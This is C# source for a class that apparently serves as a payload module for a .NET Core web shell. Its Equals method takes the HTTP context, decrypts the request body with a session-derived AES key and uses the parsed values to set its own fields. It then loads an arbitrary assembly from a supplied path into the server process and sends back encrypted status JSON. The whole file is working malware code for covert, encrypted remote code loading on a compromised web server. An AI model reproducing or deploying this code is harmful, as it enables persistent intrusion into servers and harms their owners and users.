using System.Data;
using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Text;
using System.Security.Cryptography;

public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;


    public string content;

    public string sessionId;


    private DefaultHttpContext context;

    private object current;

    public Dictionary<string, Object> globals = new Dictionary<string, Object>();

    public string error_msg;

    public string libPath;

    public static Dictionary<string, Object> assemblyContexts;

    public override bool Equals(object obj)
    {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            this.init(obj);


            AssemblyName libName = AssemblyName.GetAssemblyName(this.libPath);

            var assemblies = AppDomain.CurrentDomain.GetAssemblies();
            if (!globals.ContainsKey(libName.Name))
            {
                foreach (var assembly in assemblies)
                {
                    var assemblyName = assembly.GetName().Name;
                    if (assemblyName.Equals(libName.Name))
                    {
                        globals.Add(assemblyName, assembly);
                        dictionary.Add("status", "success");
                    }
                }

                if (!globals.ContainsKey(libName.Name))
                {
                    var assembly = Assembly.LoadFrom(libPath);
                    globals.Add(assembly.GetName().Name, assembly);
                    dictionary.Add("status", "success");
                }

                if (!globals.ContainsKey(libName.Name))
                {
                    throw new Exception("Assembly not found");
                }
            }
            else
            {
                dictionary.Add("status", "success");
            }
        }
        catch (Exception ex)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex.Message);
        }

        this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
        return false;
    }

    private static Assembly AssemblyResolve(object sender, ResolveEventArgs args)
    {
        Assembly assembly = null;
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
        foreach (Assembly assembly2 in assemblies)
        {
            if (assembly2.FullName == args.Name)
            {
                assembly = assembly2;
            }
        }

        return assembly;
    }


    public static string dt2json(DataTable dt)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("[");
        if (dt != null)
        {
            stringBuilder.Append("[");
            int count = dt.Columns.Count;
            for (int i = 0; i < count; i++)
            {
                stringBuilder.Append("{\"name\":\"" + dt.Columns[i] + "\"},");
            }

            stringBuilder.Remove(stringBuilder.Length - 1, 1);
            stringBuilder.Append("]");
            int count2 = dt.Rows.Count;
            if (count2 > 0)
            {
                for (int j = 0; j < count2; j++)
                {
                    stringBuilder.Append(",[");
                    for (int k = 0; k < count; k++)
                    {
                        stringBuilder.Append("\"" + dt.Rows[j][k] + "\",");
                    }

                    stringBuilder.Remove(stringBuilder.Length - 1, 1);
                    stringBuilder.Append("]");
                }
            }
        }

        stringBuilder.Append("]");
        return stringBuilder.ToString();
    }

    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }


    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(Convert.ToBase64String(Encoding.UTF8.GetBytes(dict[text])) + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    private void global()
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();


        string targetAssemblyFullName = "Echo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null";
        var targetAssembly =
            assemblies.FirstOrDefault(assembly => assembly.GetName().FullName.Equals(targetAssemblyFullName));

        if (targetAssembly != null)
        {
            string targetTypeName = "U";
            Type targetType = targetAssembly.GetType(targetTypeName);

            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                FieldInfo instancesField =
                    instance.GetType().GetField("globals", BindingFlags.Static | BindingFlags.Public);
                globals = instancesField.GetValue(null) as Dictionary<string, object>;
            }
        }
    }

    private void init(object obj)
    {
        /*
         * .net core中重构体系，所以HttpContext.Current不存在类似的
         */
        global();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillParams();
        this.fillSessionHandler();
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSessionHandler()
    {
        try
        {
            this.Session = ((HttpContext)this.context).Session;

            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));

            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }

    private void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);


            memoryStream.Seek(0, SeekOrigin.Begin);


            byte[] array = memoryStream.ToArray();


            array = Decrypt(array);


            Dictionary<string, string> extraData = getExtraData(array);


            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);


        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = bytes;
                aesAlg.IV = bytes;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                result = decryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }
        else
        {
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }

    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[]
        {
            126,
            126,
            126,
            126,
            126,
            126
        });
        byte[] bytes = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(bytes);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array = @string.Split(new char[]
        {
            ','
        });
        foreach (string text in array)
        {
            string[] array3 = text.Split(new char[]
            {
                ':'
            });
            if (array3.Length == 2)
            {
                string key = array3[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array3[1]));
                dictionary.Add(key, string2);
            }
        }

        return dictionary;
    }


    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }

    private void fillRequest(object obj)
    {
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSession()
    {
        try
        {
            this.Session = this.context.Session;
        }
        catch (Exception)
        {
            if (!context.Items.ContainsKey(this.context.Session.Id) ||
                this.context.Items[this.context.Session.Id] == null)
            {
                this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            }
        }
    }
}